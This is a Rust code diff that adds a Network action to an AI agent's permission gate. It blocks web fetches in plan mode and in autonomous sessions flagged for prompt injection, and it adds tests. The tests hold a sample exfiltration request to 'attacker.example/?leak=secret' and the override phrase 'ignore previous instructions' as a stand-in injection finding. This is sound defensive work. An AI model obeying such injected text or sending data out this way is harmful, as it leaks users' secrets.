@@ -334,7 +334,7 @@ impl PermissionGate for ConfirmationGate {
             }
             if (matches!(
                 request.action,
-                ActionKind::Write | ActionKind::Delete | ActionKind::Move
+                ActionKind::Write | ActionKind::Delete | ActionKind::Move | ActionKind::Network
             ) || matches!(request.target, PermissionTarget::Command { .. }))
                 && let Some(finding) = self.injection_taint.current()
             {
@@ -402,6 +402,16 @@ impl PermissionGate for ConfirmationGate {
                     }
                 }
             };
+        }
+
+        // Network survived plan-mode's unconditional deny (checked above,
+        // since Network is deliberately excluded from the Read|Internal
+        // fast path) and, if autonomous mode is active, the taint/cwd
+        // checks in the block above. Auto-allow with no prompt from here —
+        // same UX as before this ActionKind existed, for the case that
+        // actually matters (untainted, non-plan-mode use).
+        if request.action == ActionKind::Network {
+            return PermissionDecision::Allow;
         }
 
         // An already-approved REPL/process session (repl_send/repl_stop)
@@ -2268,5 +2278,117 @@ mod tests {
 
         assert!(!req_path.exists(), "request file must be deleted after resolution");
         assert!(!resp_path.exists(), "response file must be deleted after resolution");
+    }
+
+    fn network_request(target: &str) -> PermissionRequest {
+        PermissionRequest {
+            tool_name: "web_fetch".to_string(),
+            action: ActionKind::Network,
+            target: PermissionTarget::Other(target.to_string()),
+            arguments_preview: serde_json::json!({}),
+            preview: None,
+            diff: None,
+        }
+    }
+
+    #[tokio::test]
+    async fn network_action_is_denied_in_plan_mode() {
+        // Locks in the fix: web_fetch/web_search declared ActionKind::Read
+        // before this, hitting the Read|Internal auto-allow fast path
+        // *before* the plan-mode check below ever ran. Network is
+        // deliberately excluded from that fast path, so plan mode's
+        // unconditional deny for anything past it now actually applies.
+        let prompter = Arc::new(FakePrompter {
+            response: UserResponse::Allow,
+            calls: AtomicUsize::new(0),
+        });
+        let plan_mode = PlanMode::new();
+        plan_mode.set_active(true);
+        let gate = ConfirmationGate::new(
+            prompter.clone(),
+            vec![],
+            vec![],
+            plan_mode,
+            AutonomousMode::new(),
+            PathBuf::from("/home/user/project"),
+            false,
+        );
+
+        let decision = gate.check(&network_request("https://example.com")).await;
+
+        assert!(matches!(decision, PermissionDecision::Deny(_)));
+        assert_eq!(prompter.calls.load(Ordering::SeqCst), 0);
+    }
+
+    #[tokio::test]
+    async fn network_action_is_denied_when_session_is_injection_tainted_in_autonomous_mode() {
+        // Mirrors autonomous_mode_denies_writes_once_injection_taint_is_flagged
+        // above, but for Network -- a tainted session must not be able to
+        // exfiltrate data via an outbound fetch with zero prompts.
+        let prompter = Arc::new(FakePrompter {
+            response: UserResponse::Allow,
+            calls: AtomicUsize::new(0),
+        });
+        let autonomous_mode = AutonomousMode::new();
+        autonomous_mode.set_active(true);
+        let injection_taint = InjectionTaint::new();
+        injection_taint.flag(InjectionFinding {
+            source: "read_file: notes.txt".to_string(),
+            matched_pattern: "ignore previous instructions".to_string(),
+            excerpt: "...".to_string(),
+        });
+        let gate = ConfirmationGate::new(
+            prompter.clone(),
+            vec![],
+            vec![],
+            PlanMode::new(),
+            autonomous_mode,
+            PathBuf::from("/home/user/project"),
+            false,
+        )
+        .with_injection_taint(injection_taint);
+
+        let decision = gate
+            .check(&network_request("https://attacker.example/?leak=secret"))
+            .await;
+
+        let PermissionDecision::Deny(Some(reason)) = decision else {
+            panic!("expected a denial with a reason, got {decision:?}");
+        };
+        assert!(reason.contains("notes.txt"), "reason: {reason}");
+        assert_eq!(
+            prompter.calls.load(Ordering::SeqCst),
+            0,
+            "autonomous mode must never prompt"
+        );
+    }
+
+    #[tokio::test]
+    async fn network_action_is_still_auto_allowed_in_plain_interactive_mode() {
+        // No plan mode, no autonomous mode, no taint -- proves the fix
+        // doesn't regress ordinary UX (no new prompt for a routine,
+        // untainted fetch).
+        let prompter = Arc::new(FakePrompter {
+            response: UserResponse::Deny,
+            calls: AtomicUsize::new(0),
+        });
+        let gate = ConfirmationGate::new(
+            prompter.clone(),
+            vec![],
+            vec![],
+            PlanMode::new(),
+            AutonomousMode::new(),
+            PathBuf::from("/home/user/project"),
+            false,
+        );
+
+        let decision = gate.check(&network_request("https://example.com")).await;
+
+        assert_eq!(decision, PermissionDecision::Allow);
+        assert_eq!(
+            prompter.calls.load(Ordering::SeqCst),
+            0,
+            "Network must be auto-allowed with no prompt in plain interactive use"
+        );
     }
 }
